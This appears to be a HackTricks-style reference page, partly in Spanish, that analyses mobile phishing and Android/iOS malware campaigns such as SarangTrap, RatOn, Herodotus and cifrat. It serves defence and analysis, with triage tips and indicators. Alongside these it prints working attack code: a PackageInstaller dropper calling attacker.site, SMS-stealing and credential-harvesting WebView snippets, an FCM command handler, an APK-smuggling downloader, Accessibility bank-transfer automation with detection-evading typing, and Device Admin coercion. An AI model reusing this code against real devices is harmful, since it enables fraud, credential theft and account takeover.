# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Esta página cubre técnicas usadas por threat actors para distribuir **malicious Android APKs** y **iOS mobile-configuration profiles** a través de phishing (SEO, social engineering, fake stores, dating apps, etc.).
> El material está adaptado de la campaña SarangTrap expuesta por Zimperium zLabs (2025) y otras investigaciones públicas.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Register dozens of look-alike domains (dating, cloud share, car service…).
– Use local language keywords and emojis in the `<title>` element to rank in Google.
– Host *both* Android (`.apk`) and iOS install instructions on the same landing page.
2. **First Stage Download**
* Android: direct link to an *unsigned* or “third-party store” APK.
* iOS: `itms-services://` or plain HTTPS link to a malicious **mobileconfig** profile (see below).
3. **Post-install Social Engineering**
* On first run the app asks for an **invitation / verification code** (exclusive access illusion).
* The code is **POSTed over HTTP** to the Command-and-Control (C2).
* C2 replies `{"success":true}` ➜ malware continues.
* Sandbox / AV dynamic analysis that never submits a valid code sees **no malicious behaviour** (evasion).
4. **Runtime Permission Abuse** (Android)
* Dangerous permissions are only requested **after positive C2 response**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Recent variants **remove `<uses-permission>` for SMS from `AndroidManifest.xml`** but leave the Java/Kotlin code path that reads SMS through reflection ⇒ lowers static score while still functional on devices that grant the permission via `AppOps` abuse or old targets.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 introduced **Restricted settings** for sideloaded apps: Accessibility and Notification Listener toggles are greyed out until the user explicitly allows restricted settings in **App info**.
* Phishing pages and droppers now ship step‑by‑step UI instructions to **allow restricted settings** for the sideloaded app and then enable Accessibility/Notification access.
* A newer bypass is to install the payload via a **session‑based PackageInstaller flow** (the same method app stores use). Android treats the app as store‑installed, so Restricted settings no longer blocks Accessibility.
* Triage hint: in a dropper, grep for `PackageInstaller.createSession/openSession` plus code that immediately navigates the victim to `ACTION_ACCESSIBILITY_SETTINGS` or `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Facade UI & Background Collection**
* App shows harmless views (SMS viewer, gallery picker) implemented locally.
* Meanwhile it exfiltrates:
- IMEI / IMSI, phone number
- Full `ContactsContract` dump (JSON array)
- JPEG/PNG from `/sdcard/DCIM` compressed with [Luban](https://github.com/Curzibn/Luban) to reduce size
- Optional SMS content (`content://sms`)
Payloads are **batch-zipped** and sent via `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* A single **mobile-configuration profile** can request `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. to enroll the device in “MDM”-like supervision.
* Social-engineering instructions:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* three times (screenshots on the phishing page).
3. Trust the unsigned profile ➜ attacker gains *Contacts* & *Photo* entitlement without App Store review.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads can **pin a phishing URL to the Home Screen** with a branded icon/label.
* Web Clips can run **full-screen** (hides the browser UI) and be marked **non-removable**, forcing the victim to delete the profile to remove the icon.
9. **Network Layer**
* Plain HTTP, often on port 80 with HOST header like `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → easy to spot).

## Red-Team Tips

* **Dynamic Analysis Bypass** – During malware assessment, automate the invitation code phase with Frida/Objection to reach the malicious branch.
* **Manifest vs. Runtime Diff** – Compare `aapt dump permissions` with runtime `PackageManager#getRequestedPermissions()`; missing dangerous perms is a red flag.
* **Network Canary** – Configure `iptables -p tcp --dport 80 -j NFQUEUE` to detect unsolid POST bursts after code entry.
* **mobileconfig Inspection** – Use `security cms -D -i profile.mobileconfig` on macOS to list `PayloadContent` and spot excessive entitlements.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indicadores (Genéricos)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Este patrón se ha observado en campañas que abusan de temas de beneficios gubernamentales para robar credenciales UPI y OTPs indias. Los operadores encadenan plataformas reputadas para la entrega y la resiliencia.

### Cadena de entrega a través de plataformas de confianza
- Video señuelo de YouTube → la descripción contiene un short link
- Shortlink → sitio de phishing en GitHub Pages que imita el portal legítimo
- El mismo repo de GitHub aloja un APK con una falsa insignia de “Google Play” que enlaza directamente al archivo
- Las páginas de phishing dinámicas viven en Replit; el canal remoto de comandos usa Firebase Cloud Messaging (FCM)

### Dropper con payload embebido e instalación offline
- El primer APK es un instalador (dropper) que incluye el malware real en `assets/app.apk` y le indica al usuario que desactive Wi‑Fi/datos móviles para reducir la detección en la cloud.
- El payload embebido se instala bajo una etiqueta inocua (por ejemplo, “Secure Update”). Tras la instalación, tanto el instalador como el payload quedan presentes como apps separadas.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Descubrimiento dinámico de endpoints mediante shortlink
- El malware obtiene una lista de endpoints activos en texto plano, separada por comas, desde un shortlink; simples transformaciones de cadenas producen la ruta final de la página de phishing.

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Recolección de credenciales UPI basada en WebView
- El paso “Make payment of ₹1 / UPI‑Lite” carga un formulario HTML del atacante desde el endpoint dinámico dentro de un WebView y captura campos sensibles (phone, bank, UPI PIN) que se `POST`ean a `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Autopropagación e interceptación de SMS/OTP
- Se solicitan permisos agresivos en la primera ejecución:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Los contactos se usan en bucle para enviar masivamente SMS de smishing desde el dispositivo de la víctima.
- Los SMS entrantes son interceptados por un broadcast receiver y subidos con metadatos (sender, body, SIM slot, per-device random ID) a `/addsm.php`.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) como C2 resiliente
- El payload se registra en FCM; los mensajes push llevan un campo `_type` usado como switch para activar acciones (p. ej., actualizar plantillas de texto de phishing, alternar comportamientos).

Ejemplo de payload de FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Boceto de Handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicadores/IOCs
- APK contiene payload secundario en `assets/app.apk`
- WebView carga el pago desde `gate.htm` y exfiltra a `/addup.php`
- Exfiltración de SMS a `/addsm.php`
- Obtención de configuración impulsada por shortlink (p. ej., `rebrand.ly/*`) que devuelve endpoints CSV
- Apps etiquetadas como genéricas “Update/Secure Update”
- Mensajes FCM `data` con un discriminador `_type` en apps no confiables

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Los atacantes reemplazan cada vez más los enlaces APK estáticos por un canal Socket.IO/WebSocket incrustado en señuelos con apariencia de Google Play. Esto oculta la URL del payload, elude filtros de URL/extensión y conserva una UX de instalación realista.

Flujo típico de cliente observado en entornos reales:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Por qué evade controles simples:
- No se expone ninguna URL estática de APK; el payload se reconstruye en memoria a partir de WebSocket frames.
- Los filtros de URL/MIME/extensión que bloquean respuestas .apk directas pueden no detectar datos binarios transportados mediante WebSockets/Socket.IO.
- Los crawlers y URL sandboxes que no ejecutan WebSockets no recuperarán el payload.

Ver también WebSocket tradecraft y tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

La campaña banker/RAT RatOn (ThreatFabric) es un ejemplo concreto de cómo las operaciones modernas de phishing móvil combinan WebView droppers, automatización de UI impulsada por Accessibility, overlays/ransom, coerción de Device Admin, Automated Transfer System (ATS), toma de control de crypto wallet, e incluso orquestación de NFC-relay. Esta sección abstrae las técnicas reutilizables.

### Stage-1: WebView → native install bridge (dropper)
Los atacantes presentan un WebView apuntando a una página del atacante e inyectan una JavaScript interface que expone un instalador nativo. Un tap en un botón HTML llama al código nativo que instala un APK de segunda etapa incluido en los assets del dropper y luego lo lanza directamente.

Patrón mínimo:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML en la página:
```html
<button onclick="bridge.installApk()">Install</button>
```
Después de la instalación, el dropper inicia el payload mediante package/activity explícito:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Idea de hunting: apps no confiables llamando `addJavascriptInterface()` y exponiendo métodos tipo instalador a WebView; APK que incluye un payload secundario embebido bajo `assets/` y que invoca la Package Installer Session API.

### Embudo de consentimiento: Accessibility + Device Admin + prompts de runtime posteriores
Stage-2 abre un WebView que aloja una página de “Access”. Su botón invoca un método exportado que lleva a la víctima a la configuración de Accessibility y solicita habilitar el servicio rogue. Una vez concedido, el malware usa Accessibility para auto-hacer clic en los siguientes diálogos de permisos de runtime (contacts, overlay, manage system settings, etc.) y solicita Device Admin.

- Accessibility ayuda programáticamente a aceptar prompts posteriores encontrando botones como “Allow”/“OK” en el node-tree y enviando clics.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Véase también:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Los operadores pueden emitir comandos para:
- renderizar un overlay a pantalla completa desde una URL, o
- pasar HTML inline que se carga en un overlay de WebView.

Usos probables: coerción (entrada de PIN), abrir wallet para capturar PINs, mensajes de ransom. Mantén un comando para asegurar que se conceda el permiso de overlay si falta.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: volcar periódicamente el árbol de nodos de Accessibility, serializar los textos/roles/límites visibles y enviarlos a C2 como una pseudo-screen (comandos como `txt_screen` una vez y `screen_live` de forma continua).
- High-fidelity: solicitar MediaProjection y empezar screen-casting/recording bajo demanda (comandos como `display` / `record`).

### ATS playbook (bank app automation)
Dado un JSON task, abre la bank app, controla la UI vía Accessibility con una mezcla de consultas de texto y taps por coordenadas, e introduce el PIN de pago de la víctima cuando se solicite.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Ejemplos de textos vistos en un flujo objetivo (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Los operadores también pueden comprobar/aumentar los límites de transferencia mediante comandos como `check_limit` y `limit`, que navegan por la UI de límites de forma similar.

### Extracción de seed de crypto wallet
Objetivos como MetaMask, Trust Wallet, Blockchain.com, Phantom. Flujo: desbloquear (PIN robado o contraseña proporcionada), navegar a Security/Recovery, revelar/mostrar la seed phrase, registrar/exfiltrarla. Implementa selectores adaptados al idioma (EN/RU/CZ/SK) para estabilizar la navegación entre idiomas.

### Coerción de Device Admin
Las APIs de Device Admin se usan para aumentar las oportunidades de captura de PIN y frustrar a la víctima:

- Bloqueo inmediato:
```java
dpm.lockNow();
```
- Expira la credencial actual para forzar el cambio (Accessibility captura el nuevo PIN/contraseña):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forzar el desbloqueo no biométrico deshabilitando las funciones biométricas de keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Muchos controles de `DevicePolicyManager` requieren `Device Owner`/`Profile Owner` en Android recientes; algunas compilaciones de OEM pueden ser menos estrictas. Valida siempre en el OS/OEM objetivo.

### Orquestación de relay NFC (NFSkate)
Stage-3 puede instalar y lanzar un módulo externo de NFC-relay (p. ej., NFSkate) e incluso pasarle una plantilla HTML para guiar a la víctima durante el relay. Esto permite cash-out contactless de tarjeta presente junto con ATS online.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Conjunto de comandos del operador (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### ATS impulsado por Accessibility con anti-detección: cadencia de texto similar a la humana e inyección dual de texto (Herodotus)

Los threat actors combinan cada vez más la automatización impulsada por Accessibility con anti-detección ajustada contra biometría básica de comportamiento. Un banker/RAT reciente muestra dos modos complementarios de entrega de texto y un toggle del operador para simular escritura humana con cadencia aleatoria.

- Discovery mode: enumerar nodos visibles con selectores y bounds para apuntar con precisión a inputs (ID, text, contentDescription, hint, bounds) antes de actuar.
- Inyección dual de texto:
- Mode 1 – `ACTION_SET_TEXT` directamente sobre el nodo objetivo (estable, sin teclado);
- Mode 2 – clipboard set + `ACTION_PASTE` en el nodo enfocado (funciona cuando el setText directo está bloqueado).
- Cadencia similar a la humana: dividir la cadena proporcionada por el operador y entregarla carácter por carácter con delays aleatorios de 300–3000 ms entre eventos para evadir heurísticas de “machine-speed typing”. Implementado ya sea haciendo crecer progresivamente el valor mediante `ACTION_SET_TEXT`, o pegando un carácter a la vez.

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Bloqueando overlays para fraude cubre:
- Renderiza un `TYPE_ACCESSIBILITY_OVERLAY` a pantalla completa con opacidad controlada por el operador; mantenlo opaco para la víctima mientras la automatización remota continúa debajo.
- Comandos normalmente expuestos: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Overlay mínimo con alpha ajustable:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator control primitives often seen: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## Dropper Android multietapa con puente WebView, decodificador de strings JNI y carga escalonada de DEX

El análisis de CERT Polska del 03 April 2026 de **cifrat** es una buena referencia para un cargador Android moderno entregado por phishing donde el APK visible es solo un shell instalador. El tradecraft reutilizable no es el nombre de la familia, sino la forma en que se encadenan las etapas:

1. La página de phishing entrega un APK señuelo.
2. La etapa 0 solicita `REQUEST_INSTALL_PACKAGES`, carga una `.so` nativa, descifra un blob incrustado e instala la etapa 2 con sesiones de **PackageInstaller**.
3. La etapa 2 descifra otro asset oculto, lo trata como un ZIP y **carga dinámicamente DEX** para el RAT final.
4. La etapa final abusa de Accessibility/MediaProjection y usa WebSockets para control/datos.

### Puente JavaScript de WebView como controlador del instalador

En lugar de usar WebView solo para branding falso, el señuelo puede exponer un puente que permita a una página local/remota identificar el dispositivo y activar la lógica nativa de instalación:
```java
webView.addJavascriptInterface(controller, "Android");
webView.loadUrl("file:///android_asset/bootstrap.html");

@JavascriptInterface
public String get_SYSINFO() { /* SDK, model, manufacturer, locale */ }

@JavascriptInterface
public void start() { mainHandler.post(this::installStage2); }
```
Ideas de triaje:
- grep para `addJavascriptInterface`, `@JavascriptInterface`, `loadUrl("file:///android_asset/` y URLs de phishing remotas usadas en la misma actividad
- busca bridges que expongan métodos tipo instalador (`start`, `install`, `openAccessibility`, `requestOverlay`)
- si el bridge está respaldado por una página de phishing, trátalo como una superficie de operador/controlador, no solo como UI

### Decodificación nativa de strings registrada en `JNI_OnLoad`

Un patrón útil es un método Java que parece inofensivo pero en realidad está respaldado por `RegisterNatives` durante `JNI_OnLoad`. En cifrat, el decoder ignoraba el primer char, usaba el segundo como una clave XOR de 1 byte, decodificaba en hex el resto y transformaba cada byte como `((b - i) & 0xff) ^ key`.

Reproducción mínima offline:
```python
def decode_native(s: str) -> str:
key = ord(s[1]); raw = bytes.fromhex(s[2:])
return bytes((((b - i) & 0xFF) ^ key) for i, b in enumerate(raw)).decode()
```
Usa esto cuando veas:
- llamadas repetidas a un método Java con soporte nativo para URLs, nombres de paquetes o keys
- `JNI_OnLoad` resolviendo clases y llamando a `RegisterNatives`
- no hay strings en texto plano significativas en DEX, pero sí muchas constantes cortas con aspecto hexadecimal pasadas a un helper

### Etapas de payload en capas: recurso XOR -> APK instalado -> asset tipo RC4 -> ZIP -> DEX

Esta familia usó dos capas de desempaquetado que vale la pena buscar de forma genérica:

- **Stage 0**: descifra `res/raw/*.bin` con una key XOR derivada a través del decodificador nativo, luego instala el APK en texto plano mediante `PackageInstaller.createSession` -> `openWrite` -> `fsync` -> `commit`
- **Stage 2**: extrae un asset inocuo como `FH.svg`, lo descifra con una rutina tipo RC4, interpreta el resultado como un ZIP y luego carga DEX files ocultos

Esto es un indicador fuerte de una cadena real de dropper/loader porque cada capa mantiene opaca la siguiente etapa frente al análisis estático básico.

Quick triage checklist:
- `REQUEST_INSTALL_PACKAGES` junto con llamadas de sesión de `PackageInstaller`
- receivers para `PACKAGE_ADDED` / `PACKAGE_REPLACED` para continuar la cadena después de la instalación
- blobs cifrados en `res/raw/` o `assets/` con extensiones no multimedia
- `DexClassLoader` / `InMemoryDexClassLoader` / manejo de ZIP cerca de decryptors personalizados

### Anti-debugging nativo mediante `/proc/self/maps`

El bootstrap nativo también escaneó `/proc/self/maps` en busca de `libjdwp.so` y abortó si estaba presente. Esta es una comprobación temprana práctica anti-analysis porque el debugging con soporte de JDWP deja una biblioteca mapeada reconocible:
```c
FILE *f = fopen("/proc/self/maps", "r");
while (fgets(line, sizeof(line), f)) {
if (strstr(line, "libjdwp.so")) return -1;
}
```
Ideas de hunting:
- grep código nativo / salida del decompiler para `/proc/self/maps`, `libjdwp.so`, `frida`, `qemu`, `goldfish`, `ranchu`
- si los hooks de Frida llegan demasiado tarde, inspecciona `.init_array` y `JNI_OnLoad` primero
- trata anti-debug + string decoder + staged install como un solo cluster, no como hallazgos independientes

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Analysis of cifrat: could this be an evolution of a mobile RAT?](https://cert.pl/en/posts/2026/04/cifrat-analysis/)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
